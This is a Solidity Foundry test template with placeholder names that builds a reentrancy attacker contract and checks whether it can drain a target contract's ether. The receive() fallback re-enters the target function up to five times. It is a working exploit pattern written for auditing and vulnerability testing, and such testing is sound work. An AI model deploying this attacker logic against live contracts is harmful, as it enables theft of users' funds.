// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "${CONTRACT_PATH}";

contract ReentrancyAttacker {
    ${CONTRACT_NAME} public target;
    uint256 public attackCount;

    constructor(address _target) {
        target = ${CONTRACT_NAME}(_target);
    }

    function attack() external payable {
        // Initial call to vulnerable function
        target.${FUNCTION_NAME}{value: msg.value}();
    }

    receive() external payable {
        if (attackCount < 5 && address(target).balance > 0) {
            attackCount++;
            target.${FUNCTION_NAME}();
        }
    }
}

contract ReentrancyTest is Test {
    ${CONTRACT_NAME} public target;
    ReentrancyAttacker public attacker;

    function setUp() public {
        target = new ${CONTRACT_NAME}();
        attacker = new ReentrancyAttacker(address(target));
        vm.deal(address(target), 10 ether);
        vm.deal(address(attacker), 1 ether);
    }

    function testReentrancy() public {
        uint256 targetBalanceBefore = address(target).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;

        attacker.attack{value: 1 ether}();

        // If attacker drained more than deposited, reentrancy worked
        assertGt(
            address(attacker).balance,
            attackerBalanceBefore,
            "Reentrancy attack should have drained funds"
        );
    }
}
